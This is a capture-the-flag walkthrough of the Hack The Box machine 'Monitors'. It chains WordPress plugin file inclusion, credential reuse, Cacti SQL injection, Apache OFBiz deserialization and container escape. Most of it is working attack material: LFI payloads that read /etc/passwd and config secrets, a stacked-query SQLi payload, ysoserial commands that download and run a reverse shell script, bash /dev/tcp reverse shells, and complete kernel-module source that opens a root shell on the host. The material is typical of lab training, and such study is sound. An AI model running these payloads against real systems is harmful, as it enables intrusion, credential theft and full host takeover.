## Monitors

https://app.hackthebox.com/machines/Monitors

<br>

### www-data

Open 10.10.10.238:22  
Open 10.10.10.238:80

WordPress 5.5.1 identified by Wappalyzer.

```
wpscan --url http://monitors.htb --api-token pP5Ha3o7a3hmaIBueWtYShULJd6FFceslCaQE3LiKYw --enumerate vp --plugins-detection aggressive
```

Plugin Identified: wp-with-spritz  
[!] 1 vulnerability identified:  
[!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion

Exploit LFI:
```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd

marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash 
```

Vulnerable Code:
```php
if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);
```

<br>

We can check to apache configuration at `/etc/apache2/sites-enabled/000-default.conf`. There we enumerate `monitors.htb.conf` and `cacti-admin.monitors.htb.conf`.

We also find credentials at `http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/www/wordpress/wp-config.php`, but they are not useful right now.
```
define( 'DB_NAME', 'wordpress' );                                               

/** MySQL database username */                                                  
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */          
define( 'DB_PASSWORD', 'BestAdministrator@2020!' ); 
```

<br>

Accessing `cacti-admin.monitors.htb` we find Cacti Version 1.2.12 and can login with admin:BestAdministrator@2020!

Use this [exploit](https://www.exploit-db.com/exploits/49810) to perform SQL Injection.
```
python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.2 --lport 1337
```

<br>

### marcus user

Inside marcus home, we have backup directory with this permissions:  
`d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup`

This means we can enter the directory, but no list it. We need to find the name of the files inside it.

Enumerating the machine, we find inside `cacti-backup.service` that the name of the file is `backup.sh`.

There is a password from Marcus inside it.
```
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

<br>

### shell on container
Looking at running process, we find this:
```
/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2
```

Port forward it:
```
ssh marcus@10.10.10.238 -L 8443:localhost:8443
```

There is nothing on the main page, but enumerating we find `/solr`.
```
gobuster dir -u https://127.0.0.1:8443 -w /usr/share/wordlists/dirb/big.txt -t 40 -k
```

Accessing this directory, we enumerate Apache OFBiz Release 17.12.0. Searching, we find ApacheOfBiz 17.12.01 - Remote Command Execution (RCE).

Searching for exploits, we find [this one](https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data) that is a metasploit module. We can read the important part of this exploit that is:
```
  def send_request_xmlrpc(data)
    # http://xmlrpc.com/
    # https://ws.apache.org/xmlrpc/
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/webtools/control/xmlrpc'),
      'ctype' => 'text/xml',
      'data' => <<~XML
        <?xml version="1.0"?>
        <methodCall>
          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                    <name>#{rand_text_alphanumeric(8..42)}</name>
                    <value>
                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">#{Rex::Text.encode_base64(data)}</serializable>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>
      XML
    )
  end
```

<br>

We can do something like this in requests:
```
POST /webtools/control/xmlrpc HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: JSESSIONID=6BED6745363C7728AAE4274F77E4B6D2.jvm1; OFBiz.Visitor=10000
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: test/xml
Content-Length: 3145

<?xml version="1.0"?>
<methodCall>
  <methodName>0xdf0xdf</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>0xdf0xdf</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[yso output here]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

<br>

Use ysoserial to generate the serialized data. Testing collections, we discover that `CommonsBeanutils1` works.
```
# Create reverse shell file
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/3333 0>&1

# Download reverse shell
ysoserial CommonsBeanutils1 'wget 10.10.14.2/rev.sh' | base64 -w 0

# Execute it
ysoserial CommonsBeanutils1 'bash rev.sh' | base64 -w 0
```

### shell as root
Enumerating container privileges.
```
capsh --print
```

Since we have `CAP_SYS_MODULE` permission, we can [follow this](https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/) and get root.

```
# Create reverse-shell.c
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kmod.h>

static char command[] = "bash -i >& /dev/tcp/10.10.14.2/8888 0>&1"; //Reverse s
hell change ip and port if needed

char *argv[] = {
    "/bin/bash",
    "-c",    // flag make command run from option list
    command, // Reverse shell
    NULL     // End of the list
};
static char *envp[] = {
    "HOME=/",
    NULL // End of the list
};

static int __init connect_back_init(void)
{

    return call_usermodehelper(
        argv[0],      // execution path
        argv,         // arguments for process
        envp,         // environment for process
        UMH_WAIT_EXEC // don't wait for program return status
    );
}

static void __exit connect_back_exit(void)
{
    printk(KERN_INFO "Exiting\n");
}

module_init(connect_back_init);
module_exit(connect_back_exit);


# Create Makefile
obj-m += reverseshell_module.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean



# Make file
make

# Shell 1
nc -lvnp 8888

# Shell 2
insmod reverseshell_module.ko
```

### extra
IppSec enumerated process via LFI.
```
for i in $(seq 0 2000); do echo -n "$1:"; curl monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../proc/$i/cmdline --output -;echo; done | tee pid.lst
```

And also find the backup filename searching for the directory .backup on the machine:
```
grep -Ri '\.backup' 2>/dev/null
```

<br>

#### Cacti Injection
The injection occurs on cacti/color.php on line 754.
```php
$sql_where = "WHERE (name LIKE '%" . get_request_var('filter') . "%'
```

You should do `db_qstr('%' . get_request_var('filter') . '%')` instead of `'%" . get_request_var('filter') . "%`.

As the application accept stacked queries, this can lead to remote code execution.
```
GET /cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='touch+/tmp/sqli_from_rce;'+where+name='path_php_binary';--+-

UNION SELECT 1,username,password,4,5,6,7 from user_auth;update settings set value='touch /tmp/sqli_from_rce;' where name='path_php_binary
```

<br>

#### Apache OfBiz Deserialization
OfBiz exposes an `XMLRPC` endpoint at `/webtools/control/xmlrpc`. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the `XMLRPC` request is processed before authentication.  
As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.
